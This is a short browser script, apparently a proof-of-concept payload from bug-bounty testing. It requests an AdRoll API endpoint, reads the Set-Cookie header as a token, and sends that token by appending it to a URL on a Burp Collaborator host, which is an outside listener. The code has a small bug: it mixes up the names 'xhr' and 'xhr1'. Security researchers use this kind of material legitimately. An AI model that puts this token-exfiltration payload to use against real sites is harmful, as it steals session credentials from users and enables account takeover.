    <script>
        
    var xhr1 = new XMLHttpRequest();

    xhr1.onreadystatechange = function()
    {
    if (xhr1.readyState == 4 && xhr.status == 200)
    {
    var yourtoken = xhr.getResponseHeader('Set-Cookie')
    var xhr2 = new XMLHttpRequest();
    xhr2.open("GET", "http://usqeegm12oxwrp7w3qvwnxamcdi46t.burpcollaborator.net/"+ yourtoken); 
    xhr2.send();
    }
    }

    xhr1.open ("GET", "https://app.adroll.com/api/v1/account/get_minimum_budgets?_escape=false&frequency=daily");

    xhr1.send();
    </script>
